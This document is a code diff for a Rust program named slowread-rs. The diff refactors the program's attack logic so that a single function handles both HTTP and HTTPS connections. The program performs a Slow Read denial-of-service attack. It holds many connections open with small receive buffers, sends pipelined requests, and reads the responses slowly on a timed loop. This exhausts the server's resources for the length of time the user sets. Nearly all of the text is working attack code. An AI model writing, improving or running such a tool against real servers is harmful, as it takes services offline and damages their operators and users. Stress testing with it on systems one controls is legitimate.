@@ -14,7 +14,7 @@ extern crate openssl;
 extern crate tokio_openssl;
 
 use request::{create_request_str, create_default_request};
-use tokio_openssl::{SslConnectorExt, SslStream};
+use tokio_openssl::SslConnectorExt;
 use openssl::ssl::{SslConnectorBuilder, SslConnector, SslMethod};
 use futures::future::{loop_fn, Future, Loop, ok};
 use futures::stream::Stream;
@@ -33,6 +33,9 @@ use tokio::io::{self, AsyncRead, AsyncWrite};
 use tokio::net::TcpStream;
 use tokio::timer::{Delay, Deadline, Interval};
 use trust_dns_resolver::Resolver;
+
+trait AsyncStream: AsyncRead + AsyncWrite + Send {}
+impl<T> AsyncStream for T where T: AsyncRead + AsyncWrite + Send {}
 
 #[derive(StructOpt, Debug)]
 #[structopt(name = "slowread-rs")]
@@ -68,15 +71,6 @@ struct Options {
     /// Duration of the attack in seconds
     #[structopt(short = "d", long = "attack-duration", default_value = "300", parse(from_str = "parse_duration"))]
     attack_duration: Duration,
-}
-
-// Workaround for trait objects with multiple traits
-trait AsyncStream: AsyncRead + AsyncWrite {}
-
-impl AsyncStream for SslStream<TcpStream> {
-}
-
-impl AsyncStream for TcpStream {
 }
 
 fn parse_duration(src: &str) -> Duration {
@@ -142,32 +136,21 @@ fn launch_attacks(
     let start_time = Instant::now();
     let sock_addr = sock_addr.clone();
     let scheme = request.uri().scheme_part().unwrap().clone();
-    let host = request.uri().authority_part().unwrap().host().to_string();
-    let request = create_request_str(&request).repeat(options.pipeline_factor);
+    let host = Arc::new(request.uri().authority_part().unwrap().host().to_string());
+    let request = Arc::new(create_request_str(&request).repeat(options.pipeline_factor));
 
     let interval = 
         Interval::new(start_time, Duration::from_secs(1))
         .for_each(move |instant| {
             while open_connections.load(Ordering::SeqCst) < options.connections {
-
-   if scheme == Scheme::HTTPS {
-                spawn(launch_attack_over_https(
-                        &host,
-                        &sock_addr,
-                        &request,
-                        &options,
-                        open_connections.clone(),
-                        ));
-   } else {
-                spawn(launch_attack_over_http(
-                        &host,
+                spawn(launch_attack(
+                        host.clone(),
                         &sock_addr,
                         &scheme,
                         &request,
                         &options,
                         open_connections.clone(),
                         ));
-   }
             }
 
             print_stats(instant.duration_since(start_time).as_secs(), &open_connections);
@@ -184,8 +167,8 @@ fn print_stats(secs_since_start: u64, open_connections: &Arc<AtomicUsize>) {
 }
 
 
-fn launch_attack_over_http(
-    host: &str,
+fn launch_attack(
+    host: Arc<String>,
     socket_addr: &SocketAddr,
     scheme: &Scheme,
     request: &str,
@@ -197,7 +180,7 @@ fn launch_attack_over_http(
     let read_len = options.read_len;
     let recv_buffer_size = rng.gen_range(options.min_recv_buffer_size, options.max_recv_buffer_size);
     let request = request.to_string();
-    let host = host.clone();
+    let scheme = scheme.clone();
 
     open_connections.fetch_add(1, Ordering::SeqCst);
     let err_open_conns = open_connections.clone();
@@ -213,7 +196,7 @@ fn launch_attack_over_http(
             .set_recv_buffer_size(recv_buffer_size)
             .unwrap();
 
-        if *scheme == Scheme::HTTPS {
+        if scheme == Scheme::HTTPS {
             let builder = SslConnector::builder(SslMethod::tls()).unwrap();
 
             Box::new(SslConnectorExt::connect_async(&SslConnectorBuilder::build(builder), &host, tcp_stream)
@@ -221,13 +204,11 @@ fn launch_attack_over_http(
                     err_open_conns_2.fetch_sub(1, Ordering::SeqCst);
                     println!("{:?}", e);
                 }).and_then(move |tcp_stream| {
-                    ok(Box::new(tcp_stream) as Box<AsyncStream>)
-                })) as Box<Future<Item = Box<AsyncStream>, Error = ()>>
+                    ok(Box::new(tcp_stream) as Box<AsyncStream + Send>)
+                })) as Box<Future<Item = Box<AsyncStream + Send>, Error = ()> + Send>
         } else {
-            Box::new(ok(ok(Box::new(tcp_stream)))) as Box<Future<Item=Box<AsyncStream>, Error = ()>>
+            Box::new(ok(Box::new(tcp_stream) as Box<AsyncStream + Send>)) as Box<Future<Item=Box<AsyncStream + Send>, Error = ()> + Send>
         }
-                        
-
 
     }).and_then(move |tcp_stream| {
         io::write_all(tcp_stream, request)
@@ -251,65 +232,4 @@ fn launch_attack_over_http(
                 })
         })
     })
-}
-
-fn launch_attack_over_https(
-    host: &str,
-    socket_addr: &SocketAddr,
-    request: &str,
-    options: &Options,
-    open_connections: Arc<AtomicUsize>,
-    ) -> impl Future<Item = (), Error = ()> {
-    let mut rng = rand::thread_rng();
-    let wait_time = options.wait_time;
-    let read_len = options.read_len;
-    let recv_buffer_size = rng.gen_range(options.min_recv_buffer_size, options.max_recv_buffer_size);
-    let request = request.to_string();
-    let host = host.to_string();
-
-    open_connections.fetch_add(1, Ordering::SeqCst);
-    let err_open_conns = open_connections.clone();
-    let err_open_conns_2 = open_connections.clone();
-
-    TcpStream::connect(&socket_addr)
-        .map_err(move |e| {
-            err_open_conns.fetch_sub(1, Ordering::SeqCst);
-            println!("{:?}", e);
-        }).and_then(move |tcp_stream| {
-            tcp_stream
-                .set_recv_buffer_size(recv_buffer_size)
-                .unwrap();
-
-            let builder = SslConnector::builder(SslMethod::tls()).unwrap();
-
-            SslConnectorExt::connect_async(&SslConnectorBuilder::build(builder), &host, tcp_stream)
-                .map_err(move |e| {
-                    err_open_conns_2.fetch_sub(1, Ordering::SeqCst);
-                    println!("{:?}", e);
-                })
-        }).and_then(move |tcp_stream| {
-
-            io::write_all(tcp_stream, request)
-                .map_err(|e| println!("{:?}", e))
-
-        }).and_then(move |(tcp_stream, _buf)| {
-            loop_fn(tcp_stream, move |tcp_stream| {
-                let mut buf: Vec<u8> = Vec::with_capacity(read_len);
-                buf.resize(read_len, 0);
-
-                io::read_exact(tcp_stream, buf)
-                    .then(move |res| {
-                        let (wait_time, value) = match res {
-                            Err(_) => (Duration::from_secs(0), ok(Loop::Break(()))),
-                            Ok((tcp_stream, _)) => {
-                                (wait_time, ok(Loop::Continue(tcp_stream)))
-                            }
-                        };
-
-                        Delay::new(Instant::now() + wait_time)
-                            .map_err(|e| println!("{:?}", e))
-                            .and_then(|_| value)
-                    })
-            })
-        })
 }
